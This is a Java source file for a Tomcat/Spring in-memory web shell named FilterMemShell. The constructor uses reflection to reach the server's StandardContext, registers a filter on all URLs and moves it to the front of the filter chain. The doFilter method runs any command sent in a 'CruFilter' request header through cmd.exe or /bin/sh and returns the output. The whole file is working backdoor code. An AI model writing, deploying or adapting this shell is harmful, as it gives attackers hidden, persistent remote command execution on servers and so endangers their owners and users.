import org.apache.catalina.core.ApplicationContext;
import org.apache.catalina.core.ApplicationContextFacade;
import org.apache.catalina.core.StandardContext;
import org.apache.tomcat.util.descriptor.web.FilterDef;
import org.apache.tomcat.util.descriptor.web.FilterMap;
import org.springframework.web.context.request.RequestContextHolder;
import org.springframework.web.context.request.ServletRequestAttributes;

import javax.servlet.*;
import javax.servlet.http.HttpServletRequest;
import java.io.IOException;
import java.io.PrintWriter;
import java.lang.reflect.Field;

public class FilterMemShell implements Filter {

    public FilterMemShell() {
        try {
            // 0x00 Get servletContext from request
            ServletRequestAttributes attr = (ServletRequestAttributes) RequestContextHolder.getRequestAttributes();
            ServletContext svlContext = attr.getRequest().getServletContext();
            ApplicationContextFacade appCtxFacade = (ApplicationContextFacade) svlContext;
            Field appCtxField = ApplicationContextFacade.class.getDeclaredField("context");
            appCtxField.setAccessible(true);
            // 0x01 Get applicationContext from servletContext
            ApplicationContext appCtx = (ApplicationContext) appCtxField.get(appCtxFacade);
            Field stdCtxField = ApplicationContext.class.getDeclaredField("context");
            stdCtxField.setAccessible(true);
            // 0x02 Get standardContext from applicationContext
            StandardContext stdCtx = (StandardContext) stdCtxField.get(appCtx);

            // 01 Add filterDef(set filter) for standardContext
            FilterMemShell filterMemShell = new FilterMemShell("");
            FilterDef filterDef = new FilterDef();
            filterDef.setFilterClass("com.best.hello.FilterMemShell");
            filterDef.setFilterName(filterMemShell.getClass().getName());
            filterDef.setFilter(filterMemShell);
            stdCtx.addFilterDef(filterDef);
            // According filterDefs reBuild filterConfig
            stdCtx.filterStart();
            // 02 Add filterMap
            FilterMap filterMap = new FilterMap();
            filterMap.setFilterName(filterMemShell.getClass().getName());
            filterMap.setDispatcher("REQUEST");
            filterMap.addURLPattern("/*");
            stdCtx.addFilterMap(filterMap);
            // 03 move filter to the position First of filterMaps
            // just improve sequence
            FilterMap[] filterMaps = stdCtx.findFilterMaps();
            FilterMap[] tmpFilterMaps = new FilterMap[filterMaps.length];
            int j = 1;
            for (int i = 0; i < filterMaps.length; i++) {
                FilterMap tmpFilter = filterMaps[i];
                if (tmpFilter.getFilterName().equalsIgnoreCase(filterMemShell.getClass().getName())) {
                    tmpFilterMaps[0] = tmpFilter;
                } else {
                    tmpFilterMaps[j++] = tmpFilter;
                }
            }
            // result tmpFilterMaps
            for (int i = 0; i < filterMaps.length; i++) {
                filterMaps[i] = tmpFilterMaps[i];
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public FilterMemShell(String str) {
    }

    @Override
    public void doFilter(ServletRequest request, ServletResponse response, FilterChain filterChain) throws IOException, ServletException {
        String scode = ((HttpServletRequest)request).getHeader("CruFilter");
        if (scode != null && !"".equals(scode.trim())) {
            try {
                PrintWriter writer = response.getWriter();
                String o = "";
                ProcessBuilder p;
                if (System.getProperty("os.name").toLowerCase().contains("win")) {
                    p = new ProcessBuilder(new String[]{"cmd.exe", "/c", scode});
                } else {
                    p = new ProcessBuilder(new String[]{"/bin/sh", "-c", scode});
                }
                java.util.Scanner c = new java.util.Scanner(p.start().getInputStream()).useDelimiter("\\A");
                o = c.hasNext() ? c.next() : o;
                c.close();
                writer.write(o);
                writer.flush();
                writer.close();

                // drop filter
                return;
            } catch (Exception e) {
                e.printStackTrace();
            }
        }

        filterChain.doFilter(request, response);
    }
}
